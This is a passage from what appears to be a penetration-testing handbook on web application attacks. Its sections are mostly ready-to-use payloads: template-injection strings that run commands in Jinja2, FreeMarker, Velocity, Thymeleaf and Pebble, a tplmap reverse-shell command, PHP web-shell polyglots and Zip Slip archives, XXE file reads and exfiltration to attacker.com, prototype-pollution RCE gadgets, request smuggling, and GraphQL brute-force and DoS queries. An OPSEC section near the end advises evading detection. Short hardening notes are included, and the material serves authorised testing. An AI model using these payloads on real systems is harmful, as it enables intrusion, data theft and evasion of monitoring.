    {{c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
  {% endif %}
{% endfor %}

# Direct import via builtins
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Using lipsum (Flask internal)
{{lipsum.__globals__.os.popen('id').read()}}

# Using cycler (Flask internal)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Filter bypass - no underscores
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Filter bypass - no dots
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}

# Filter bypass - no brackets
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
```

### 5.3 FreeMarker (Java)

```java
// Command execution
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// ObjectConstructor
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign runtime=oc("java.lang.Runtime")>
${runtime.getRuntime().exec("id")}

// JythonRuntime
<#assign jr="freemarker.template.utility.JythonRuntime"?new()>
<@jr>import os; os.system("id")</@jr>

// File read
<#assign is=oc("java.io.FileInputStream","/etc/passwd")>
<#assign isr=oc("java.io.InputStreamReader",is)>
<#assign br=oc("java.io.BufferedReader",isr)>
${br.readLine()}
```

### 5.4 Velocity (Java)

```java
// Command execution
#set($runtime = $class.inspect("java.lang.Runtime").type)
#set($process = $runtime.getRuntime().exec("id"))
#set($reader = $class.inspect("java.io.BufferedReader").type)
#set($inputStream = $class.inspect("java.io.InputStreamReader").type)
#set($isr = $inputStream.getConstructor($process.getInputStream().getClass().getInterfaces()[0]).newInstance($process.getInputStream()))
#set($br = $reader.getConstructor($isr.getClass().getInterfaces()[0]).newInstance($isr))
$br.readLine()
```

### 5.5 Thymeleaf (Java/Spring)

```java
// Spring Expression Language (SpEL) injection
${T(java.lang.Runtime).getRuntime().exec('id')}

// URL-based (path variable injection)
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// Fragment expression injection
~{::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}__}
```

### 5.6 Pebble (Java)

```java
// RCE via runtime
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]))}%}
```

### 5.7 SSTI Tools

```bash
# Tplmap - automatic SSTI exploitation
python tplmap.py -u "http://target/page?name=*"
python tplmap.py -u "http://target/page?name=*" --os-shell
python tplmap.py -u "http://target/page?name=*" -e jinja2 --reverse-shell attacker_ip 4444

# SSTImap (modern fork)
python sstimap.py -u "http://target/page?name=*"
```

---

## 6. File Upload Attacks

### 6.1 Extension Bypass Techniques

```
# Double extensions
shell.php.jpg
shell.php.png
shell.php5
shell.phtml
shell.pHp    (case variation on case-insensitive filesystems)

# Alternative PHP extensions
.php, .php2, .php3, .php4, .php5, .php6, .php7, .pht, .phtm, .phtml
.phps, .pgif, .shtml, .phar

# ASP/ASPX alternatives
.asp, .aspx, .ashx, .asmx, .ascx, .config, .cshtml, .svc

# JSP alternatives
.jsp, .jspx, .jsw, .jsv, .jspf

# Null byte injection (older systems)
shell.php%00.jpg
shell.php\x00.jpg

# Trailing characters
shell.php.
shell.php...
shell.php%20
shell.php%0a
shell.php%0d%0a

# Windows-specific
shell.php::$DATA           (NTFS Alternate Data Stream)
shell.php::$DATA.jpg
shell.p]hp                 (Windows wildcard)

# .htaccess upload (Apache)
# Upload .htaccess file:
AddType application/x-httpd-php .jpg
# Then upload shell.jpg (will be parsed as PHP)

# .htaccess + mod_lua (Apache -- when no PHP/Java available)
# If SFTP/file upload access exists but no server-side language is installed,
# check if mod_lua is enabled. Create .htaccess to register Lua handler:
#
# .htaccess contents:
# AddHandler lua-script .lua
#
# Then upload a Lua script (e.g., cmd.lua):
# require "apache2"
# function handle(r)
#     r.content_type = "text/plain"
#     local handle = io.popen("id")
#     r:puts(handle:read("*a"))
#     handle:close()
#     return apache2.OK
# end
#
# Navigate to: http://target/path/cmd.lua
# Requires: AllowOverride is not set to None in Apache config
# Remediation: Set AllowOverride None; disable mod_lua if unused
#
# Reference: watson0x90. Code Execution via mod_lua in Apache.
# https://watson0x90.com/code-execution-via-mod-lua-in-apache-d5081f7f35d9
```

### 6.2 Magic Bytes and Polyglots

```bash
# JPEG polyglot with PHP
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# PNG polyglot
# PNG magic bytes: \x89\x50\x4E\x47\x0D\x0A\x1A\x0A
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php

# GIF polyglot
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Using ExifTool to embed in metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg

# PDF polyglot (for PDF upload features)
# Embed JavaScript in PDF that triggers when opened
```

### 6.3 Path Traversal in Filename

```
# Overwrite files via directory traversal in upload filename
filename="../../../../var/www/html/shell.php"
filename="..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"

# Zip Slip (archive extraction vulnerability)
# Create archive with path traversal entries:
python3 -c "
import zipfile
z = zipfile.ZipFile('exploit.zip', 'w')
z.writestr('../../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
z.close()
"
# When extracted, the file is written outside the intended directory

# Tar-based directory traversal
tar cf exploit.tar --transform='s/shell.php/..\/..\/..\/..\/var\/www\/html\/shell.php/' shell.php
```

---

## 7. XML External Entity (XXE) Injection

### 7.1 Classic XXE

```xml
<!-- File read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>

<!-- Windows file read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>

<!-- PHP filter for base64 encoding (avoids XML parsing issues) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>
```

### 7.2 Blind OOB XXE

```xml
<!-- External DTD for data exfiltration -->
<!-- Malicious DTD hosted at http://attacker.com/evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

<!-- Payload sent to target: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>

<!-- Error-based XXE (extract data in error messages) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

### 7.3 XXE via File Formats

```
# XXE in DOCX files
# DOCX files are ZIP archives containing XML files
# Inject XXE payload into word/document.xml or [Content_Types].xml
unzip document.docx
# Edit [Content_Types].xml to include XXE payload
# Re-zip and upload

# XXE in SVG images
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>

# XXE in SOAP requests
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <test>&xxe;</test>
  </soapenv:Body>
</soapenv:Envelope>

# XXE in XLSX (Excel)
# Inject into xl/workbook.xml or shared strings
# XXE in RSS/Atom feeds, XSLT stylesheets, XML-RPC, WebDAV PROPFIND
```

### 7.4 Parameter Entity Tricks

```xml
<!-- Parameter entities (%) are used within the DTD itself -->
<!-- Useful when regular entities are blocked -->

<!-- Internal subset with parameter entity -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/combine.dtd">
  %dtd;
]>
<root>&combined;</root>

<!-- combine.dtd on attacker server: -->
<!ENTITY combined "%start;%file;%end;">
```

---

## 8. Prototype Pollution

### 8.1 Server-Side Prototype Pollution (Node.js)

```javascript
// Prototype pollution occurs when attacker can modify Object.prototype
// Common sinks: deep merge/clone functions, recursive object assignment

// Detection payloads (JSON body):
{"__proto__": {"polluted": "true"}}
{"constructor": {"prototype": {"polluted": "true"}}}

// Verify: if the application reflects {"polluted": "true"} on new objects,
// the prototype has been polluted.

// Status code override (Express.js detection):
{"__proto__": {"status": 510}}

// JSON spaces detection (Express):
{"__proto__": {"json spaces": "  "}}
// If response JSON becomes indented, pollution worked

// Content-type override:
{"__proto__": {"content-type": "application/x-www-form-urlencoded"}}
```

### 8.2 Prototype Pollution to RCE

```javascript
// Gadget: child_process.spawn/exec with shell option
// Pollute: {"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
// When any child_process.spawn is called without explicit shell option,
// it inherits the polluted shell

// Gadget: EJS template engine (CVE-2022-29078 and variants)
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// Gadget: Pug template engine
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}

// Gadget: Handlebars
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "params": [], "path": "constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\")')()"}]}}

// Universal Node.js gadgets (from research by Shcherbakov et al.):
// execArgv + NODE_OPTIONS pollution
{"__proto__": {"execArgv": ["--eval=process.mainModule.require('child_process').execSync('id')"]}}

// env pollution for spawned processes
{"__proto__": {"env": {"NODE_OPTIONS": "--require=/proc/self/environ", "NODE_DEBUG": "require('child_process').execSync('id')"}}}
```

### 8.3 Client-Side Prototype Pollution

```javascript
// URL-based pollution vectors:
// https://target.com/?__proto__[polluted]=true
// https://target.com/?__proto__.polluted=true
// https://target.com/#__proto__[polluted]=true

// Common client-side gadgets lead to XSS:
// jQuery $.extend deep merge
// Lodash _.merge, _.defaultsDeep
// Hoek.merge (Hapi.js ecosystem)

// Detection tools: PPScan, proto-find (Burp extensions)
```

---

## 9. HTTP Request Smuggling

HTTP request smuggling exploits discrepancies in how front-end (proxy/load balancer) and back-end servers parse HTTP request boundaries. This can lead to request hijacking, cache poisoning, and security bypass.

### 9.1 CL.TE (Content-Length vs Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
The front-end uses Content-Length (reads 13 bytes), the back-end uses Transfer-Encoding chunked (reads until 0\r\n), leaving "SMUGGLED" prepended to the next request.

### 9.2 TE.CL (Transfer-Encoding vs Content-Length)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```
The front-end uses Transfer-Encoding (reads all chunks), the back-end uses Content-Length (reads only 3 bytes: "8\r\n"), leaving the rest as a new request.

### 9.3 TE.TE (Transfer-Encoding obfuscation)

```http
# Obfuscate Transfer-Encoding header so one server ignores it:
Transfer-Encoding: chunked
Transfer-Encoding : chunked          (trailing space)
Transfer-Encoding: xchunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
Transfer-encoding: chunked           (lowercase)
Transfer-Encoding: identity, chunked
Transfer-Encoding:[\x09]chunked      (tab before value)
Transfer-Encoding:\nchunked          (newline)
[space]Transfer-Encoding: chunked    (leading space)
X: X[\n]Transfer-Encoding: chunked   (header continuation)
```

### 9.4 H2.CL / H2.TE Desync (HTTP/2 Downgrade)

```
# HTTP/2 to HTTP/1.1 downgrade attacks
# When a front-end speaks HTTP/2 to clients but HTTP/1.1 to backend

# H2.CL: Smuggle via Content-Length in HTTP/2
# HTTP/2 does not use Content-Length for framing (uses stream framing)
# But if the front-end forwards it to an HTTP/1.1 backend:
:method POST
:path /
:authority target.com
content-length: 0
transfer-encoding: chunked

41
GET /admin HTTP/1.1
Host: target.com

0


# H2.TE: Inject Transfer-Encoding via HTTP/2
# HTTP/2 should not allow Transfer-Encoding but some proxies pass it through

# CRLF injection in HTTP/2 headers (binary framing allows injecting \r\n)
# Inject additional headers into the HTTP/1.1 translation:
:method POST
:path /
header: value\r\nTransfer-Encoding: chunked

# Chunked extension parsing exploit (CVE-2025-49812)
# Bare semicolons in chunk-size lines cause parsing discrepancies
# Apache HTTP Server through 2.4.63 was vulnerable to TLS upgrade desync

# Detection tools:
# Burp Request Smuggler extension (v1.26+ supports H2 probing)
# smuggler.py - HTTP Request Smuggling / Desync Testing Tool
# h2csmuggler - HTTP/2 cleartext smuggling
```

### 9.5 Exploitation Scenarios

```
# 1. Request hijacking (steal other users' requests)
# Smuggle a partial request that captures the next user's request as POST body

# 2. Cache poisoning
# Smuggle a request that causes the cache to store malicious content
# for a legitimate URL path

# 3. Bypass front-end security controls
# Access /admin by smuggling past the proxy's access control

# 4. Credential theft
# Smuggle a request that redirects to attacker-controlled server,
# capturing cookies and authorization headers

# 5. Web cache deception
# Force caching of authenticated responses for unauthenticated paths
```

---

## 10. GraphQL Attacks

### 10.1 Introspection and Schema Discovery

```graphql
# Full introspection query
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}

# Minimal introspection
{__schema{types{name,fields{name}}}}

# If introspection is disabled, use field suggestion exploitation
# Send intentionally misspelled fields:
{usernme}
# Response: "Did you mean 'username'?"
# Brute-force field names using common wordlists

# Tools: GraphQL Voyager (visualization), InQL (Burp extension), graphql-cop
# Clairvoyance - reconstruct schema from field suggestions without introspection
```

### 10.2 Query Batching and DoS

```graphql
# Batching attack - send array of queries
[
  {"query": "{systemUpdate(name: \"test\") { id }}"},
  {"query": "{systemUpdate(name: \"test\") { id }}"},
  {"query": "{systemUpdate(name: \"test\") { id }}"}
]

# This bypasses per-request rate limiting (1 HTTP request = N operations)

# Brute force via batching (e.g., OTP enumeration)
[
  {"query": "mutation { login(otp: \"0000\") { token }}"},
  {"query": "mutation { login(otp: \"0001\") { token }}"},
  {"query": "mutation { login(otp: \"0002\") { token }}"},
  ...
]

# Depth-based DoS (nested queries)
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}

# Alias-based DoS
{
  q1: user(id: 1) { name }
  q2: user(id: 2) { name }
  q3: user(id: 3) { name }
  # ... hundreds of aliases in one query
}

# Circular fragment DoS
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
{ user(id: 1) { ...A } }
```

### 10.3 Authorization Bypass

```graphql
# Direct Object Reference via GraphQL
{ user(id: 2) { email, password_hash, ssn } }

# Access mutations without authorization checks
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 2, role: "admin") { success } }

# Accessing hidden fields via introspection
# Discover fields like: passwordHash, internalId, adminNotes, apiKey

# Bypassing field-level authorization via fragments
{
  user(id: 1) {
    ... on AdminUser { secretData }
    ... on RegularUser { publicData }
  }
}
```

---

## 11. API Security Attacks

### 11.1 Broken Object Level Authorization (BOLA/IDOR)

```bash
# Classic IDOR - enumerate object IDs
GET /api/v1/users/1001/profile
GET /api/v1/users/1002/profile  # Access another user's data

# GUID/UUID prediction
# While UUIDs are hard to guess, they may be leaked in:
# - API responses listing objects
# - Error messages
# - Referer headers
# - Public endpoints (e.g., /api/posts lists author UUIDs)

# Testing methodology:
# 1. Create two accounts (attacker, victim)
# 2. Perform actions as victim, capture object IDs
# 3. Replay requests as attacker using victim's object IDs
# 4. Test across all HTTP methods (GET, PUT, DELETE, PATCH)
```

### 11.2 Mass Assignment

```bash
# Send additional parameters that map to model attributes
# Original request:
POST /api/users/register
{"username": "attacker", "email": "a@b.com", "password": "pass123"}

# Mass assignment attack:
POST /api/users/register
{"username": "attacker", "email": "a@b.com", "password": "pass123",
 "role": "admin", "is_admin": true, "verified": true, "balance": 999999}

# Parameter discovery:
# - Check API documentation / OpenAPI spec
# - Observe all response fields (some may be writable)
# - Test common privilege fields: role, admin, is_admin, type,
#   permissions, group, verified, active, approved

# PUT vs PATCH: PUT may reset unspecified fields to defaults,
# PATCH only updates specified fields - test both
```

### 11.3 Rate Limiting Bypass

```bash
# IP rotation headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Endpoint variation
/api/v1/login
/api/v1/login/
/api/v1/Login
/api/v1/LOGIN
/api/v1//login
/api/v1/login?dummy=1

# HTTP method variation
POST /api/login -> PUT /api/login

# Case variation in parameters
{"email": "USER@test.com"} vs {"email": "user@test.com"}

# Unicode normalization bypass
{"email": "\u0075ser@test.com"}  (unicode 'u')

# Add null bytes or special characters
{"email": "user@test.com\x00"}
{"email": "user@test.com%00"}
```

---

## 12. 2025-2026 Techniques and Research

### 12.1 Recent CVEs and Exploits

```
# CVE-2025-49812 - Apache HTTP Server HTTP/2 Desync
# Versions through 2.4.63 vulnerable to TLS upgrade desync
# Allows session hijacking via man-in-the-middle HTTP desynchronization
# Impact: Session hijacking, request smuggling in TLS upgrade flows

# CVE-2025-1094 - PostgreSQL psql SQL Injection
# Invalid UTF-8 character handling allows SQL injection in psql
# Can chain to arbitrary code execution via psql meta-commands
# Fixed in PostgreSQL 17.3, 16.7, 15.11, 14.16, 13.19

# CVE-2025-2945 - pgAdmin 4.9.1 Authenticated RCE
# Authenticated remote code execution in pgAdmin web interface

# CVE-2025-23061 - MongoDB/Mongoose Nested $where Bypass
# Top-level $where was blocked in 8.8.3 but nesting under $or bypassed filter
# Fixed in 8.9.5 with sanitizeFilter: true option

# AI/LLM-Specific Vulnerabilities (2025-2026)
# - Prompt injection via web application input -> LLM -> command execution
# - SSRF via LLM tool-use (LLM fetches attacker-controlled URLs)
# - Server-side template injection through LLM-generated content
# - Supply chain attacks via AI model repositories
```

### 12.2 Emerging Attack Vectors

```
# AI-Powered Attack Automation (2025)
# - Automated vulnerability discovery using LLM-based fuzzing
# - AI-assisted WAF bypass payload generation
# - Intelligent parameter brute-forcing with context-aware mutation

# Cloud-Native Attack Surface
# - Kubernetes API server exploitation via SSRF
# - Serverless function event injection (AWS Lambda, Azure Functions)
# - Container escape via web application -> container runtime CVE
# - Service mesh (Istio/Envoy) configuration exploitation

# Supply Chain Attacks on Web Applications
# - Dependency confusion in npm/pip/maven repositories
# - Compromised CDN resources (Polyfill.io incident pattern)
# - Malicious browser extensions targeting web application sessions
# - CI/CD pipeline injection via pull request webhooks

# HTTP/3 and QUIC Considerations
# - New desync possibilities as HTTP/3 adoption increases
# - UDP-based protocol opens new attack surface
# - Middlebox interference and fallback behavior exploitation

# Modern Framework-Specific Attacks
# - Next.js Server Actions exploitation
# - React Server Components (RSC) injection
# - Remix loader/action function manipulation
# - Edge runtime SSRF in Vercel/Cloudflare Workers
```

### 12.3 Updated Tooling (2025-2026)

```bash
# Nuclei - Template-based vulnerability scanner
nuclei -u https://target.com -t cves/ -t vulnerabilities/
nuclei -u https://target.com -tags sqli,ssrf,ssti,xxe

# Caido - Modern Burp Suite alternative (gaining popularity 2025)
# Rust-based, faster than Burp for large-scale testing

# SQLRecon - C# toolkit for MSSQL post-exploitation
# Modernizes SQL Server red team operations

# Interactsh - OOB interaction server (replaces Collaborator for open-source)
interactsh-client

# ffuf - Fast web fuzzer for parameters, directories, virtual hosts
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403

# GraphQL-specific tools
# Clairvoyance - schema reconstruction without introspection
# graphql-cop - GraphQL security auditing
# InQL v5 - updated Burp extension for GraphQL testing

# jwt_tool v2 - comprehensive JWT testing
python3 jwt_tool.py -M at $TOKEN

# SSTImap - Modern SSTI exploitation framework (fork of Tplmap)
python sstimap.py -u "http://target/?param=*"
```

---

## Detection and Defense

### Web Application Firewall (WAF) Detection

```bash
# Identify WAF presence
wafw00f https://target.com
nmap --script http-waf-detect,http-waf-fingerprint target

# Common WAF indicators:
# - Modified error pages (Cloudflare, AWS WAF, Akamai)
# - Specific response headers (X-Sucuri-ID, X-CDN, etc.)
# - Connection resets on malicious payloads
# - CAPTCHA challenges on repeated testing

# WAF bypass strategies (general):
# 1. Find origin IP (DNS history, certificate transparency, email headers)
# 2. Use alternative protocols (HTTP/2, WebSocket)
# 3. Payload encoding and fragmentation
# 4. Slow-rate attacks below detection thresholds
# 5. Target WAF rule gaps with polymorphic payloads
```

### Hardening Recommendations

```
# SQL Injection Defense:
- Parameterized queries / prepared statements (primary defense)
- Stored procedures (with parameterized calls)
- Input validation (whitelist approach)
- Least privilege database accounts
- WAF rules as defense-in-depth (not primary)

# SSRF Defense:
- Allowlist for outbound requests (URLs, IPs, protocols)
- Network segmentation (deny metadata endpoint access)
- IMDSv2 enforcement (AWS)
- DNS resolution validation (prevent rebinding)
- Disable unnecessary URL schemes (gopher, dict, file)

# Deserialization Defense:
- Avoid native deserialization of untrusted data
- Use safe data formats (JSON with strict schemas)
- Integrity checks (HMAC signatures on serialized data)
- Class allowlisting in deserialization libraries
- Java: ObjectInputFilter (JEP 290), look-ahead deserialization

# JWT Defense:
- Enforce algorithm at server configuration level
- Never use "none" algorithm
- Validate all header parameters (jku, jwk, kid)
- Use asymmetric algorithms (RS256/ES256)
- Short token expiration with refresh tokens
```

---

## OPSEC Considerations

```
# Traffic Generation:
- SQLi testing generates distinctive log patterns (UNION SELECT, SLEEP, etc.)
- Use Burp Collaborator or self-hosted interactsh for OOB channels
- Rate-limit automated scans to avoid triggering WAF/IDS
- Use legitimate User-Agent strings and TLS fingerprints

# Attribution Risk:
- Web application logs capture source IP, user-agent, timestamps
- WAFs may capture full request/response pairs
- Cloud WAFs (Cloudflare, AWS WAF) have centralized logging
- Use proxy chains or cloud-based testing infrastructure

# Payload Fingerprinting:
- Default ysoserial/SQLMap payloads are heavily signatured
- Customize payloads to avoid tool-specific detection signatures
- Modify SQLMap tamper scripts for target environment
- Use manual exploitation for high-value targets

# Data Handling:
- Exfiltrated data (credentials, PII) must be handled per engagement ROE
- Use encrypted channels for data transfer
- Document findings without storing unnecessary sensitive data
- Clean up web shells and uploaded files after testing

# Evasion Techniques:
- Distribute attacks across multiple source IPs
- Use time-delayed injection to avoid burst detection
- Leverage legitimate application functionality for testing
- Test during business hours to blend with normal traffic
- Fragment payloads across multiple requests where possible
```

---

## Cross-References

- [../00-methodology/README.md](../00-methodology/README.md) - Overall engagement methodology
- [../01-reconnaissance/README.md](../01-reconnaissance/README.md) - Web application reconnaissance
- [../03-execution/README.md](../03-execution/README.md) - Post-exploitation execution techniques
- [../05-privilege-escalation/README.md](../05-privilege-escalation/README.md) - Privilege escalation after initial access
- [../07-credential-access/README.md](../07-credential-access/README.md) - Credential harvesting from web applications
- [../09-lateral-movement/database-exploitation.md](../09-lateral-movement/database-exploitation.md) - Database exploitation for lateral movement
- [../13-cloud-security/README.md](../13-cloud-security/README.md) - Cloud-specific exploitation (SSRF to cloud pivot)
- [../TOOLS_ARSENAL.md](../TOOLS_ARSENAL.md) - Complete tools reference

---

## References

- OWASP Top 10 (2021): https://owasp.org/Top10/
- OWASP Web Security Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/
- MITRE ATT&CK T1659: https://attack.mitre.org/techniques/T1659/
- PortSwigger HTTP/2 Research: https://portswigger.net/research/http2
- Imperva Chunked Extension Smuggling: https://www.imperva.com/blog/smuggling-requests-with-chunked-extensions-a-new-http-desync-trick/
- PentesterLab JWT Guide: https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide
- F5 Labs SSRF Campaign (March 2025): https://www.f5.com/labs/articles/campaign-targets-amazon-ec2-instance-metadata-via-ssrf
- Ghost Security SSRF Prevention 2025: https://ghostsecurity.com/blog/how-to-prevent-ssrf-attacks-in-2025
- KTH Server-Side Prototype Pollution Gadgets: https://github.com/KTH-LangSec/server-side-prototype-pollution
- Silent Spring - Prototype Pollution to RCE (USENIX 2023): https://www.usenix.org/conference/usenixsecurity23/presentation/shcherbakov
- Check Point SSTI Research (2024): https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/
- CVE-2025-49812 Apache HTTP Server Desync: https://outpost24.com/blog/request-smuggling-http-2-downgrading/
- CVE-2025-1094 PostgreSQL SQL Injection: https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/
- GraphQL DoS Vulnerabilities 2025: https://markaicode.com/graphql-api-dos-vulnerabilities-2025/
- Java Deserialization Cheat Sheet: https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- watson0x90: Code Execution via mod_lua in Apache: https://watson0x90.com/code-execution-via-mod-lua-in-apache-d5081f7f35d9
